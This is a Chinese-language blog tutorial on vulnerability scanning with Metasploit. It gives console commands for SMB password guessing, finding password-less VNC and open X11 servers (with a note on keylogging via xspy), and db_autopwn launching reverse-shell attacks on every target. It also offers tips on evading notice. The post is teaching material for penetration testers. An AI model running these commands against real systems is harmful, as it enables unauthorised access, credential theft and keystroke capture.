---
layout: post
title: Metasploit渗透测试指南2-漏洞扫描
subtitle: Author：a-fickle
date: 2023-07-10 12:00:00 +0800
tag: [Metasploit,渗透测试]
cover-img: /assets/img/2023-07-10-Metasploit渗透测试指南2-漏洞扫描/cover.png
---

**声明：**            
* 本文介绍的渗透测试技术基本都是围绕Metasploit的使用。                    
* 本文所介绍的渗透测试技术均以建设安全、健康的网络环境为目的，本着探讨网络安全技术的初衷和目的，不得用于任何恶意或非法的用途，一切渗透测试行为均需要得到测试目标的书面授权并且在合法的情况下才能进行。          
* 本文作者不会宽恕或鼓励滥用本文讨论的渗透测试技术进行非法活动的行为，也不会对其承担任何责任。                             
          
           
&nbsp;     
## 漏洞扫描：          
### 1. 基础漏洞扫描：        
#### 1.1 netcat：               
* 作用：特定端口的漏洞扫描。       
* 命令：nc -vz <目标主机> <端口>   （"-v"选项用于启用详细输出，"-z"选项用于扫描端口而不进行数据传输）                                             
* 注意：这只是一个基本的端口扫描，它可以帮助确定目标主机上是否存在特定端口的漏洞。但是，进行全面的漏洞扫描通常需要更专业的漏洞扫描器。            
         
### 2. 常用漏洞扫描器：            
#### 2.1 需要注意：               
* 所有的扫描器都遵循宁可误报，不可漏报的原则。       
* 使用漏洞扫描器通常会在网络上产生大量流量，因此如果不想被别人发现渗透测试踪迹，就要用手工的方式，虽然手工方式要更费时费力。                  

#### 2.2 NeXpose：             
* 作用：输出.xml漏洞扫描报告。       

#### 2.3 Nessus：             
* 作用：输出.nessus漏洞扫描报告。       

#### 2.4 报告导入Metasploit：             
命令：             
msf > db_connect postgres:toor@127.0.0.1/msf3              
msf > db_import [扫描报告路径]              
msf > db_hosts -c address,svcs,vulns (检查报告数据是否正确导入)             
msf > db_vulns (显示详细的漏洞列表)             
msf > db_destroy postgres:toor@127.0.0.1/msf3   （删除现有的数据库）             

### 3. 专用漏洞扫描器：            
#### 3.1 SMB验证登录扫描器：             
* 作用：对大量主机的用户名和口令进行猜解。            
* 注意：这种扫描的动静很大，容易被察觉，而且每一次登陆尝试都会在被扫描的Windows主机系统日志中留下痕迹。              
* 命令：           
msf > use auxiliary/scanner/smb/smb_login            
msf auxiliary(smb_login) > show options       
msf auxiliary(smb_login) > set RHOSTS 192.168.1.150-155            
msf auxiliary(smb_login) > set SMBUser [用户名]                 
msf auxiliary(smb_login) > set SMBPass [口令]                  
msf auxiliary(smb_login) > run              
#### 3.2 扫描开放的VNC空口令：             
* 作用：对一段IP地址进行扫描，在其中搜索未设置口令的VNC服务器。            
* 注意：VNC类似于远程桌面连接，如果管理员使用后忘记删除，就可能留下没有补丁的VNC服务，但通常情况下不容易扫描到。              
* 命令：           
msf > use auxiliary/scanner/vnc/vnc_none_auth            
msf auxiliary(vnc_none_auth) > show options                 
msf auxiliary(vnc_none_auth) > set RHOSTS 192.168.1.155            
msf auxiliary(vnc_none_auth) > run              
* 如果找到了一台没有口令的VNC服务器，可以使用vncviewer连接到目标主机上未设置口令的VNC服务器。                 
#### 3.3 扫描开放的X11服务器：             
* 作用：与VNC类似，X11服务器允许用户无需身份认证即可连接，但是新的操作系统已经停用。            
* 命令：           
msf > use auxiliary/scanner/x11/open_x11            
msf auxiliary(open_x11) > show options                 
msf auxiliary(open_x11) > set RHOSTS 192.168.1.0/24            
msf auxiliary(open_x11) > set THREADS 50              
msf auxiliary(open_x11) > run              
* 可以使用xspy对目标主机进行击键记录。                 

### 3. 利用扫描结果自动化攻击：            
* 工具：Autopwn             
* 命令：            
msf > db_connect postgres:toor@127.0.0.1/msf3            
msf > db_import /root/nessus.nbe           
msf > db_autopwn -e -t -r -x -p               
* 参数：             
e：对所有目标发起攻击；          
t：显示所有匹配的模块；               
r：使用反弹shell的攻击载荷；             
x：根据漏洞选择攻击模块；              
p：根据开放端口选择攻击模块。                
* 作用：如果攻击成功，会返回一个被攻击计算机的控制shell。              
* 注意：当自动攻击启动后，目标系统可能会变得不稳定或崩溃。因此，可以仅选择“最佳”级别的攻击点进行攻击。可以输入db_autopwn h查看更多使用方法。                   


              
           
&nbsp;             
**参考文献：**《Metasploit-The Penetration Tester's Guide》                
               
              


















